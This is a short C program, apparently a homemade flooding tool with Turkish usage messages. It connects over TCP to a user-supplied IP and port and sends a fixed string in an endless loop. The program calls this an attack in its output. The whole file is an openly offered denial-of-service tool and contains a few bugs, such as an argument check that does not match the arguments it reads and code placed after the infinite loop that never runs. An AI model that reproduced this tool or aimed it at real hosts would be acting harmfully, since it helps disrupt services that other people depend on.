#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <string.h> 
   
int main(int argc, char **argv) 
{ 

	if(argc < 2){
		
		printf("\nHatali kullanim girildi !\n");
		printf("Kullanim ./%s < ip > < port >\n",argv[0]);
		printf("Created: DJ Pizza",argv[0]);
		exit(-1);
	}


    struct sockaddr_in address; 
    int sock = 0, valread; 
    struct sockaddr_in serv_addr; 
    char *hello = "DJ Pizza : @Batu07040™!"; 
    char buffer[1024] = {0}; 
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    } 
   
    memset(&serv_addr, '0', sizeof(serv_addr)); 
   
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(atoi(argv[2])); 
       
    // Convert IPv4 and IPv6 addresses from text to binary form 
    if(inet_pton(PF_INET, argv[1], &serv_addr.sin_addr)<=0)  
    { 
        printf("\nInvalid address/ Address not supported \n"); 
        return -1; 
    } 
   
 
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) 
    { 
        printf("\nSockets Failed !\n"); 
        return -1; 
    } 
	for(;;){
    send(sock , hello , strlen(hello) , 0 ); 
	}
    printf("Attack Sended\n"); 
    valread = read( sock , buffer, 1024); 
    printf("%s\n",buffer ); 

	return 0; 
	
} 

